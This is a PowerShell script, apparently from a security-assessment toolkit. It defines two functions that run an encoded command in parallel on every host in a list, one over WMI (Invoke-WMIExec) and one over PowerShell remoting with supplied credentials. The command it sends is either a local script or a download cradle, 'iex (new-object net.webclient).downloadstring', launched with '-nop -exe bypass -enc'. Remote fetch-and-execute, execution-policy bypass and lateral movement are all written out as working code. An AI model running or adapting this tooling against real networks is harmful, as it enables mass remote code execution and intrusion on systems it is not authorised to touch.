#Multi Threading :D
#Install-Module -Name PoshRSJob -Force
#Too big scripts will not work with ScriptPath
#Maybe need manually import of wmiexec.ps1
. $PSScriptRoot\WmiExec.ps1
function Invoke-WindowsWMI{
    #Todo: Add support for local scripts
    param (
        [Parameter(Position=0,ValueFromPipeline=$True)]
        $Computers = ".\windows.txt",

        [ValidateScript({Test-Path -Path $_ })]
        $ScriptPath,
        
        [string]$Url
    )
    #Import ComputerNames
    if(Test-Path $Computers){
        $Computers = Get-Content $Computers -ErrorAction Stop
    }
    #Import dependencies
    try{
        Import-Module PoshRSJob
        . $PSScriptRoot\WmiExec.ps1
    }catch{
        Write-Output "[-] $($_.Exception.Message)"
        return
    }
    #Error checking
    if(($null -eq $Url) -and ($null -eq $ScriptPath)){
        return
    }
    #Make sure Invoke-WMIExec is imported
    $wmi=(Get-ChildItem function: | where {$_.name -like 'Invoke-WMIExec'})
    if(-not($wmi)){
        Write-Output "Please import WmiExec.ps1 manually"
        Write-Output ". .\WmiExec.ps1"
        return
    }
    #Create output folder
    $OutputFolder = "$((Get-Location).path)\windows"
    if(-not(Test-Path $OutputFolder)){
        New-Item -ItemType Directory -Name 'windows' -Path "." | Out-Null
    }
    #Args
    if($ScriptPath){
        $cmd=Get-Content $ScriptPath -ErrorAction Stop
    }else{
        $cmd="iex (new-object net.webclient).downloadstring('$Url')"
    }
    $Enc=[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd))
    $ScriptParams = @{
        'Location' = $OutputFolder
        'Enc' = $Enc
    }
    #One thread for every computer :D
    Get-RSJob | where {$_.state -like 'Completed'} | Remove-RSJob
    $Computers | start-rsjob -Name {$_} -ArgumentList $ScriptParams -FunctionsToLoad 'Invoke-WMIExec' -ScriptBlock {
        param($Inputargs)
        $Location = $Inputargs.Location
        $Enc = $Inputargs.Enc
        $output = Invoke-WMIExec -ComputerName $_ -Command "powershell -nop -exe bypass -enc $Enc"
        Add-Content -Path "$Location\$($_)" -Value $output
    } | Wait-RSJob -ShowProgress
    $errors=Get-RSJob | where {$_.HasErrors -eq $true}
    if($errors){
        Write-Output "[-] Failed connecting to following hosts"
        Write-Output $errors
    }
}
#Invoke-WindowsWMI -Url 'https://raw.githubusercontent.com/cube0x0/Security-Assessment/master/Testing/chaps.ps1'
#Invoke-WindowsWMI -ScriptPath 'smallerscript.ps1'


#Multi Threading :D
#Install-Module -Name PoshRSJob -Force
#Too big scripts will not work with ScriptPath
function Invoke-WindowsPS{
    param (
        [Parameter(Position=0,ValueFromPipeline=$True)]
        $Computers = ".\windows.txt",
        
        [ValidateScript({Test-Path -Path $_ })]
        $ScriptPath,

        [string]$Url,

        [Parameter(Mandatory=$true)]
        [pscredential]$Credential,

        [bool]$UseSSL = $False
    )
    #Import ComputerNames
    if(Test-Path $Computers){
        $Computers = Get-Content $Computers -ErrorAction Stop
    }
    #Import dependencies
    try{
        Import-Module PoshRSJob
    }catch{
        Write-Output "[-] $($_.Exception.Message)"
        return
    }
    #Error checking
    if(($null -eq $Url) -and ($null -eq $ScriptPath)){
        return
    }
    #Create output folder
    $OutputFolder = "$((Get-Location).path)\windows"
    if(-not(Test-Path $OutputFolder)){
        New-Item -ItemType Directory -Name 'windows' -Path "." | Out-Null
    }
    #Args
    if($ScriptPath){
        $cmd=Get-Content $ScriptPath -ErrorAction Stop
    }else{
        $cmd="iex (new-object net.webclient).downloadstring('$Url')"
    }
    $Enc=[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd))
    $ScriptParams = @{
        'Location' = $OutputFolder
        'Enc' = $Enc
        'Credential' = $Credential
        'UseSSL' = $UseSSL
    }
    #One thread for every computer :D
    Get-RSJob | where {$_.state -like 'Completed'} | Remove-RSJob
    $Computers | start-rsjob -Name {$_} -ArgumentList $ScriptParams -ScriptBlock {
            param($Inputargs)
            $Location = $Inputargs.Location
            $Enc = $Inputargs.Enc
            $Credential = $Inputargs.Credential
            try{
                if($Inputargs.UseSSL){
                    $session = New-PSSession -ComputerName $_ -Credential $Credential -UseSSL -ErrorAction Stop
                }else{
                    $session = New-PSSession -ComputerName $_ -Credential $Credential -ErrorAction Stop
                }
            }catch{
                Add-Content -Path "$Location\$($_)" -Value '[-] Error connecting to host'
            }
            try{
                $output = Invoke-Command -Session $session -ScriptBlock {powershell -nop -exe bypass -enc $args[0]} -ArgumentList $Enc
            }catch{
                $output = "[-] $($_.Exception.Message)"
            }
            Add-Content -Path "$Location\$($_)" -Value $output
            Remove-PSSession $session
            
    } | Wait-RSJob -ShowProgress
    $errors = Get-RSJob | where {$_.HasErrors -eq $true}
    if($errors){
        Write-Output "[-] Failed on following hosts"
        Write-Output $errors
    }
}
#Invoke-WindowsPS -Url 'https://raw.githubusercontent.com/cube0x0/Security-Assessment/master/Testing/chaps.ps1'
#Invoke-WindowsPS -ScriptPath 'smallerscript.ps1'